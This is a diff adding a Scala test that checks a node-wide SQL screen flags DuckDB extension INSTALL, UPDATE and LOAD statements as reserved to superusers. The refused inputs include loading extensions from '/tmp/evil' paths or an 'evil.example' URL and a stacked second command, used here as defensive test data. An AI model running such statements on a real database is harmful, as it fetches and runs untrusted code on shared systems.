@@ -362,3 +362,26 @@ class NodeWideSettingScreenSpec extends AnyFlatSpec with Matchers:
           Some(NodeSettingScreen.NodeWideRefusal)
       }
     }
+
+  // INSTALL downloads extension code onto the shared node (from the default repository too), and
+  // LOAD from a path or URL runs code read from a file; operators install at node start.
+  "INSTALL and LOAD from a source" should "be reserved to superusers in every mode" in {
+    List(
+      "INSTALL httpfs",
+      "install httpfs",
+      "FORCE INSTALL httpfs",
+      "INSTALL httpfs FROM core",
+      "INSTALL '/tmp/evil.duckdb_extension'",
+      "UPDATE EXTENSIONS",
+      "UPDATE EXTENSIONS (httpfs)",
+      "LOAD '/tmp/evil.duckdb_extension'",
+      "LOAD 'https://evil.example/x.duckdb_extension'",
+      "SELECT 1; INSTALL spatial",
+      "EXPLAIN ANALYZE INSTALL httpfs"
+    ).foreach { sql =>
+      withClue(sql)(NodeSettingScreen.screenNodeWide(sql) shouldBe defined)
+    }
+    List("LOAD httpfs", "load parquet", "UPDATE t SET a = 1", "SELECT install FROM t").foreach {
+      sql => withClue(sql)(NodeSettingScreen.screenNodeWide(sql) shouldBe None)
+    }
+  }
